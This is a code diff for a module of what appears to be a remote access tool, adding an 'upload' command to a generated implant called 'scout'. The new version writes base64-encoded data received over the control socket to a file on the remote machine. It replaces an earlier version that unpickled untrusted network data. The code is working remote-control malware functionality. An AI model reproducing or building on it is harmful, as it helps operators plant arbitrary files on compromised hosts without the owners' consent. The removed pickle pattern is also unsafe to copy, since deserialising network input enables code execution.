@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -6,22 +5,21 @@ config.main()
 
 def main(option):
     if option == 'generate':
-        config.import_statements.append('from pickle import loads')
+        config.import_statements.append('from base64 import b64decode')
         config.functions.append('''
-def upload():    
-    pickled_data = recv_all(s)
-    data = loads(pickled_data)
-    filename = data[0]
+def upload(data):
+    data = data.split(' ')
+    filename = ' '.join(data[1:-1])
     f = open(filename,'wb')
-    f.write(data[1])
-    s.sendall('[+]Successfully uploaded file')''')
+    f.write(b64decode(data[-1]))
+    s.sendall('[+]Successfully wrote uploaded file data'.encode())''')
         config.logics.append('''
             elif command == "upload":
-                upload()''')
+                upload(data)''')
         config.help_menu['upload <Local file path>'] = 'Remotely upload a file to remote current working directory of scout'
     elif option == 'info':
-        print '\nName             : Upload File component' \
+        print('\nName             : Upload File component' \
               '\nOS               : Linux' \
-              '\nRequired Modules : pickle' \
+              '\nRequired Modules : base64' \
               '\nCommands         : upload <Local file path>' \
-              '\nDescription      : Remotely upload a file to remote current working directory of scout\n'
+              '\nDescription      : Remotely upload a file to remote current working directory of scout, utilizes base64 to encode binary data\n')
